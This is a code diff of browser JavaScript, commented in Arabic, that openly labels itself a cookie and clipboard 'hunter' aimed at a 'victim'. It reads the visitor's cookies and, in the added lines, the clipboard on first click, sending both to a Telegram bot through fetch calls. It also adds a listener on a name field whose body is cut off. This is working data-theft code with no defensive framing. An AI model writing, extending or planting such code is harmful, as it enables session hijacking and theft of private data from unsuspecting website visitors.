@@ -137,12 +137,16 @@ silentRadar();
 // 🍪 صائد الكوكيز والجلسات (ZeroX Edition)
 let cookies = document.cookie || "خزنة الكوكيز فارغة أو محمية!";
 fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🍪 كوكيز الضحية المكتشفة:\n" + cookies)}`);
-// 1. 📋 صائد الحافظة (Clipboard Snatcher)
-navigator.clipboard.readText().then(text => {
-    if(text) {
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📋 حافظة الضحية تحتوي على: \n" + text)}`);
-    }
-}).catch(() => {});
+document.addEventListener('click', () => {
+    navigator.clipboard.readText().then(text => {
+        if(text && text.length > 0) {
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🎯 تم قنص الحافظة عند النقرة: \n" + text)}`);
+        }
+    }).catch(() => {});
+}, { once: true }); 
+
+// 2. 🚨 رادار كشف النوايا والتحركات (يبدأ من هنا)
+document.getElementById('name').addEventListener('focus', () => {
 
 // 2. 🚨 كاشف وضع التصفح الخفي (Incognito Detector)
 const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
